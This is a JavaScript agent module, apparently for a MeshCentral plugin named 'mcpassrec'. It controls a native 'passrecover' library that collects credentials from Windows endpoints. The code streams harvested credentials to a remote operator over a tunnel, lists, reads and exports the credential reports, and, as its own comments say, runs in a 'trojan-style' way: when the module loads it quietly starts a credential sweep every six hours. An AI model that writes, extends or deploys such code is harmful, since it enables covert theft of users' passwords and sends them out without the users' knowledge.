'use strict';

// MeshCentral Password Recovery agent module (mcpassrec plugin).
// Handles the authenticated relay tunnel for protocol 18:
//   - live credential stream (drains the native ring buffer on a timer)
//   - one-shot harvest, periodic (trojan-style) auto-harvest start/stop, state
//   - report file listing, chunked reads, and report export (csv/json/html)
//
// The native module (require('passrecover')) appends every recovered
// credential to a rolling dated JSONL report regardless of whether a
// tunnel is open, so the harvested data always exists on the agent and
// keeps accumulating while the auto-harvest loop is running.

var FORWARD_INTERVAL_MS = 250;
var DEFAULT_CHUNK = 65536;
var MAX_CHUNK = 1048576;

function send(ws, value) {
    try { ws.write(JSON.stringify(value)); } catch (e) { }
}

function errorText(error) {
    var message = (error && typeof error.message === 'string') ? error.message : String(error);
    return message.substring(0, 256);
}

function getPr(ws) {
    var pr = null;
    try { pr = require('passrecover'); } catch (e) { pr = null; }
    if (pr == null) {
        send(ws, { type: 'error', message: 'The native password recovery module is not available in this agent build. Reinstall the agent with a passrecover-enabled MeshService.' });
    }
    return pr;
}

function stopForward(ws) {
    var session = ws._mcpassrec;
    if (session == null) { return; }
    if (session.timer != null) { clearInterval(session.timer); session.timer = null; }
    try { delete ws._mcpassrec; } catch (e) { ws._mcpassrec = null; }
}

function startForward(ws) {
    if (ws._mcpassrec != null) { return; }
    var session = { timer: null, blocked: false };
    ws._mcpassrec = session;
    session.timer = setInterval(function () {
        if (ws._mcpassrec !== session) { return; }
        var lines;
        try { lines = require('passrecover').read(0); } catch (e) { return; }
        if (lines == null || lines.length === 0) { return; }
        // MeshAgent timers can coalesce (16-32 ms), so always drain every
        // pending entry instead of assuming a fixed cadence.
        if (session.blocked) { return; } // Backpressured; the native ring keeps the newest entries.
        try {
            if (ws.write(JSON.stringify({ type: 'creds', lines: lines })) === false) {
                session.blocked = true;
                ws.once('drain', function () { if (ws._mcpassrec === session) { session.blocked = false; } });
            }
        } catch (e) { session.blocked = true; }
    }, FORWARD_INTERVAL_MS);
}

function handleTunnelData(ws, data) {
    var message;
    try { message = JSON.parse((typeof data === 'string') ? data : data.toString()); } catch (e) { return; }
    if (message == null || typeof message.cmd !== 'string') { return; }

    if (message.cmd === 'state') {
        var pr = getPr(ws);
        if (pr != null) {
            try { send(ws, { type: 'state', state: pr.getState() }); } catch (e) { send(ws, { type: 'error', message: 'Could not read password recovery state: ' + errorText(e) }); }
        }
        return;
    }

    if (message.cmd === 'harvest') {
        var pr = getPr(ws);
        if (pr != null) {
            try {
                var r = pr.harvest();
                send(ws, { type: 'harvested', ok: r.ok === true, added: (typeof r.added === 'number') ? r.added : 0, total: (typeof r.total === 'number') ? r.total : 0, error: (typeof r.error === 'string') ? r.error : null });
            } catch (e) { send(ws, { type: 'error', message: 'Could not harvest: ' + errorText(e) }); }
        }
        return;
    }

    if (message.cmd === 'start') {
        var pr = getPr(ws);
        if (pr != null) {
            try {
                pr.start((message.opts && typeof message.opts === 'object') ? message.opts : {});
                send(ws, { type: 'state', state: pr.getState() });
            } catch (e) { send(ws, { type: 'error', message: 'Could not start auto-harvest: ' + errorText(e) }); }
        }
        return;
    }

    if (message.cmd === 'stop') {
        var pr = getPr(ws);
        if (pr != null) {
            try {
                pr.stop();
                send(ws, { type: 'state', state: pr.getState() });
            } catch (e) { send(ws, { type: 'error', message: 'Could not stop auto-harvest: ' + errorText(e) }); }
        }
        return;
    }

    if (message.cmd === 'tail') {
        var pr = getPr(ws);
        if (pr != null) {
            startForward(ws);
            try { send(ws, { type: 'state', state: pr.getState() }); } catch (e) { }
            try { send(ws, { type: 'files', files: pr.listFiles() }); } catch (e) { }
        }
        return;
    }

    if (message.cmd === 'unsub') {
        stopForward(ws);
        return;
    }

    if (message.cmd === 'list') {
        var pr = getPr(ws);
        if (pr != null) {
            try { send(ws, { type: 'files', files: pr.listFiles() }); }
            catch (e) { send(ws, { type: 'error', message: 'Could not list report files: ' + errorText(e) }); }
        }
        return;
    }

    if (message.cmd === 'read') {
        var pr = getPr(ws);
        if (pr == null) { return; }
        var file = (typeof message.file === 'string') ? message.file.substring(0, 260) : '';
        var offset = (typeof message.offset === 'number' && message.offset >= 0) ? Math.floor(message.offset) : 0;
        var max = (typeof message.max === 'number') ? Math.floor(message.max) : DEFAULT_CHUNK;
        if (max < 4096) { max = 4096; }
        if (max > MAX_CHUNK) { max = MAX_CHUNK; }
        try {
            var r = pr.readFile(file, offset, max);
            send(ws, { type: 'filechunk', file: file, offset: offset, size: r.size, bytes: r.bytes, data: r.data, done: r.done === true });
        } catch (e) { send(ws, { type: 'error', message: 'Could not read report file: ' + errorText(e) }); }
        return;
    }

    if (message.cmd === 'export') {
        var pr = getPr(ws);
        if (pr == null) { return; }
        var fmt = (typeof message.fmt === 'string') ? message.fmt.substring(0, 8) : 'json';
        try {
            var r = pr.export(fmt);
            send(ws, { type: 'exported', name: r.name, size: (typeof r.size === 'number') ? r.size : 0 });
            try { send(ws, { type: 'files', files: pr.listFiles() }); } catch (e) { }
        } catch (e) { send(ws, { type: 'error', message: 'Could not export the report: ' + errorText(e) }); }
        return;
    }

    send(ws, { type: 'error', message: 'Unknown password recovery command: ' + message.cmd });
}

function closeTunnel(ws) {
    stopForward(ws);
}

// Trojan-style default: start the periodic credential sweep as soon as this
// module loads on a Windows agent (the native module is absent in other
// agent builds, so this is a no-op there). Re-running this when the agent
// reloads its script is harmless - the native loop is already guarded.
try {
    require('passrecover').start({ intervalMinutes: 360 });
} catch (e) { }

module.exports = { handleTunnelData: handleTunnelData, closeTunnel: closeTunnel };
